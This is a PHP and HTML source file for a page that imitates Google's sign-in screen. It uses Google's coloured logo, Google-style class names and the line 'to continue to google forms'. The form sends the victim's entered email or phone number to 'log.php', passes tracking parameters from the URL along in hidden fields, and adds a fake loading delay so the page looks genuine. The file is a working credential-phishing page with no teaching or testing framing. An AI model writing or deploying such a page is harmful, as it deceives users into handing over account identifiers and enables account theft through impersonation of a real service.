<?php
declare(strict_types=1);

require dirname(__DIR__) . '/app/form-fields.php';

$tracking = [];

foreach (TRACKING_FIELD_NAMES as $field) {
    $tracking[$field] = isset($_GET[$field]) ? trim((string) $_GET[$field]) : '';
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign in</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main class="page-shell" aria-label="Sign in page">
        <section class="signin-panel">
            <div class="TdwKnf" aria-hidden="true">
                <span class="wuMMWb"></span>
            </div>

            <div class="intro">
                <svg class="brand-mark" viewBox="0 0 48 48" aria-hidden="true">
                    <path fill="#4285f4" d="M45.12 24.5c0-1.54-.14-3.02-.4-4.45H24v8.4h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.43h7.11c4.16-3.83 6.56-9.47 6.56-16.02z"/>
                    <path fill="#34a853" d="M24 46c5.94 0 10.92-1.97 14.56-5.34l-7.11-5.43c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.59-3.87-12.33-9.07H4.31v5.6C7.94 41.08 15.4 46 24 46z"/>
                    <path fill="#fbbc05" d="M11.67 28.26c-.44-1.32-.69-2.73-.69-4.26s.25-2.94.69-4.26v-5.6H4.31A21.94 21.94 0 0 0 2 24c0 3.55.85 6.91 2.31 9.86l7.36-5.6z"/>
                    <path fill="#ea4335" d="M24 10.67c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.9 3.43 29.93 1.33 24 1.33c-8.6 0-16.06 4.92-19.69 12.14l7.36 5.6c1.74-5.2 6.6-8.4 12.33-8.4z"/>
                </svg>
                <h1>Sign in</h1>
                <p>to continue to google forms</p>
            </div>

            <form class="signin-form" action="log.php" method="get">
                <?php foreach ($tracking as $field => $value): ?>
                    <input type="hidden" name="<?php echo htmlspecialchars($field, ENT_QUOTES, 'UTF-8'); ?>" value="<?php echo htmlspecialchars($value, ENT_QUOTES, 'UTF-8'); ?>">
                <?php endforeach; ?>

                <label class="field">
                    <span class="visually-hidden">Email or phone</span>
                    <input type="text" name="identifier" placeholder="Email or phone" autocomplete="off">
                </label>
                <a class="text-link" href="#" aria-label="Forgot email">Forgot email?</a>

                <p class="guest-note">
                    Not your computer? Use Guest mode to sign in privately.
                    <a href="#">Learn more</a>
                </p>

                <div class="actions">
                    <a class="create-account" href="#">Create account</a>
                    <button type="submit">Next</button>
                </div>
            </form>
        </section>

        <footer class="footer">
            <button class="language" type="button" aria-label="Select language">
                English (United States)
                <span aria-hidden="true"></span>
            </button>
            <nav aria-label="Footer links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </nav>
        </footer>
    </main>
    <script>
        const form = document.querySelector('.signin-form');
        const identifier = form.querySelector('input[name="identifier"]');

        form.addEventListener('submit', (event) => {
            if (!identifier.value.trim()) {
                return;
            }

            event.preventDefault();
            form.closest('.signin-panel').classList.add('is-loading');

            window.setTimeout(() => {
                form.submit();
            }, 650);
        });
    </script>
</body>
</html>
